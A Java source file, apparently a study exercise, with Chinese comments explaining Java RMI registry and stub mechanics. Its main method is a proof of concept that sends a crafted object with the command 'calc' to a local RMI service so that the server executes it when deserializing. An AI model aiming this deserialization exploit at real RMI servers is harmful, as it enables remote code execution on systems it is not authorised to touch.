package com.yale.test.java.classpath.rmi.cnblogs;

import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * https://www.cnblogs.com/tr1ple/p/12231677.html 《关于<Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上）>看后的一些》
 * 1.java rmi反序列化
 * RMI 允许一个应用程序访问另外一个服务器或虚拟机上的对象，方法和服务，它使远程方法调用就像在本地调用一样简单。它为用户屏蔽了底层的网络传输细节，使用的时候只需适当处理异常即可。
 * 所以 RMI 是非常容易使用的，但同时是非常强大的。
 * RMI 协议的数据序列化目前支持以下两种模式：
 * 	1.基于 JDK 本身的对象序列化
 * 	2.基于 HTTP 协议的数据序列化
 * 关于rmi客户端和服务端通信的过程，java的方法都实现在rmi服务端，客户端实际上是通过访问rmi注册表拿到stub，然后再通过它调用服务端方法，那么调用方法时要传递参数，参数可以为一般类型，也可以为引用类型，那么如果为引用类型，就能够利用服务端已经有的gaget chain来打server，因为参数实际上是序列化传输的，那么数据到达服务端后必定会经过反序列化。
 * Stub和Skeleton：这两个的身份是一致的，都是作为代理的存在。
 * @author issuser
 */
public class RMIClient {
	public static void main(String[] args) throws RemoteException, NotBoundException {//Java RMI恶意利用demo
		Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9999);
		/**
		 * 获取远程对象的引用
		 * 所以这里说明用的是注册表对象的远程引用，也就是RegistryImpl_stub，对应的rt.jar!\sun\rmi\registry\RegistryImpl_Stub.class中客户端可以执行的操作如下所示:
		 * 放一张seebug的图， 所以客户端要访问远程对象就由服务端首先把远程对象注册到注册表，然后客户端先访问注册表拿到远程对象的stub以后，此时就可以像访问本地一样调用远程对象方法，
		 * 底层由stub再接受客户端的参数和方法，然后就是stub作为代理再帮客户端请求服务端，把参数和方法都发送到服务端，服务端接收到参数和方法后，在服务端进行执行，
		 * 再把返回结果给客户端的stub，stub再给客户端，所以客户端实际上看不到底层的通信逻辑，这种架构设计已经屏蔽了底层通信。
		 */
		Services services = (Services)registry.lookup("Services");
		System.out.println("services的真实对象为:" + services.getClass().getName());
		PublicKnown mailicious = new PublicKnown();
		mailicious.setParam("calc");
		mailicious.setMessage("haha");
		
		//使用远程对象的引用调用对应的方法，此时客户端要打服务端，因此要将恶意的对象作为参数传递到服务端，此时序列化的对象将在服务端反序列化
		//此时要传递的恶意对象肯定要符合服务端参数类型的定义
		System.out.println("服务端返回的消息为:" + services.sendMessage(mailicious));
	}
}
